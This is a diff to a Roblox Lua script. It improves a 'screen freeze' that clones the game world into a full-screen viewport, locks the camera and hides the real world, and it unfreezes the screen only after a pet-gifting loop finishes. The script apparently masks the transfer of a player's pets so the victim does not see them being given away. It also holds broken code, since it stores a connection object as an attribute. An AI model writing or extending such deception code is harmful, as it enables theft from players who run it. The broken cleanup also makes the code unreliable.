@@ -86,6 +86,7 @@ end
 local function FreezeScreen()
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
+    local RunService = game:GetService("RunService")
     
     -- Remove existing freeze if any
     pcall(function()
@@ -95,13 +96,18 @@ local function FreezeScreen()
         end
     end)
     
+    -- Freeze camera first
+    local camera = workspace.CurrentCamera
+    local frozenCFrame = camera.CFrame
+    local cameraConnection
+    
     -- Create ScreenGui with highest display order
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "ScreenFreeze"
     screenGui.DisplayOrder = 999999999
     screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
     
-    -- White flash transition
+    -- White flash transition (longer)
     local flashFrame = Instance.new("Frame")
     flashFrame.Size = UDim2.new(1, 0, 1, 0)
     flashFrame.Position = UDim2.new(0, 0, 0, 0)
@@ -115,7 +121,7 @@ local function FreezeScreen()
     viewportFrame.Size = UDim2.new(1, 0, 1, 0)
     viewportFrame.Position = UDim2.new(0, 0, 0, 0)
     viewportFrame.BackgroundTransparency = 1
-    viewportFrame.CurrentCamera = workspace.CurrentCamera
+    viewportFrame.CurrentCamera = camera
     viewportFrame.ZIndex = 5
     viewportFrame.Parent = screenGui
     
@@ -123,17 +129,35 @@ local function FreezeScreen()
     local worldModel = Instance.new("WorldModel")
     worldModel.Parent = viewportFrame
     
-    -- Clone current workspace state INCLUDING character
+    -- Clone current workspace state INCLUDING character (better method)
     local success, error = pcall(function()
+        -- Clone character specifically first
+        if LocalPlayer.Character then
+            local characterClone = LocalPlayer.Character:Clone()
+            characterClone.Parent = worldModel
+            Log("✅ Character cloned successfully")
+        end
+        
+        -- Clone all other workspace objects
         for _, obj in pairs(workspace:GetChildren()) do
-            local cloneSuccess, clone = pcall(function()
-                return obj:Clone()
-            end)
-            if cloneSuccess and clone then
-                clone.Parent = worldModel
+            if obj ~= LocalPlayer.Character then
+                local cloneSuccess, clone = pcall(function()
+                    return obj:Clone()
+                end)
+                if cloneSuccess and clone then
+                    clone.Parent = worldModel
+                end
             end
         end
     end)
+    
+    -- Freeze camera position
+    cameraConnection = RunService.Heartbeat:Connect(function()
+        camera.CFrame = frozenCFrame
+    end)
+    
+    -- Store camera connection for later cleanup
+    screenGui:SetAttribute("CameraConnection", cameraConnection)
     
     -- Hide the real world
     pcall(function()
@@ -144,18 +168,18 @@ local function FreezeScreen()
         end
     end)
     
-    -- Fade out white flash
+    -- Longer fade out white flash
     spawn(function()
-        wait(0.1)
-        for i = 1, 0, -0.1 do
+        wait(0.3) -- Wait longer before fade
+        for i = 1, 0, -0.05 do -- Slower fade
             flashFrame.BackgroundTransparency = 1 - i
-            wait(0.02)
+            wait(0.03)
         end
         flashFrame:Destroy()
     end)
     
     if success then
-        Log("🧊 Screen frozen (screenshot with character)")
+        Log("🧊 Screen frozen (screenshot with character and camera)")
         return true
     else
         Log("❌ Screenshot freeze failed: " .. tostring(error))
@@ -169,6 +193,17 @@ local function UnfreezeScreen()
     local Lighting = game:GetService("Lighting")
     
     local success, error = pcall(function()
+        -- Disconnect camera freeze first
+        local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
+        if screenGui then
+            local cameraConnection = screenGui:GetAttribute("CameraConnection")
+            if cameraConnection then
+                cameraConnection:Disconnect()
+                Log("📷 Camera unfrozen")
+            end
+            screenGui:Destroy()
+        end
+        
         -- Restore hidden objects from Lighting back to workspace
         for _, obj in pairs(Lighting:GetChildren()) do
             if obj.Name ~= "Atmosphere" and obj.Name ~= "Bloom" and obj.Name ~= "Blur" and 
@@ -178,17 +213,11 @@ local function UnfreezeScreen()
             end
         end
         
-        -- Remove freeze screen
-        local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
-        if screenGui then
-            screenGui:Destroy()
-        end
-        
         return true
     end)
     
     if success then
-        Log("🔓 Screen unfrozen - world restored")
+        Log("🔓 Screen unfrozen - world and camera restored")
         return true
     else
         Log("❌ Unfreeze failed: " .. tostring(error))
@@ -889,7 +918,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    -- UnfreezeScreen()
+    UnfreezeScreen()
     isRunning = false
 end
 
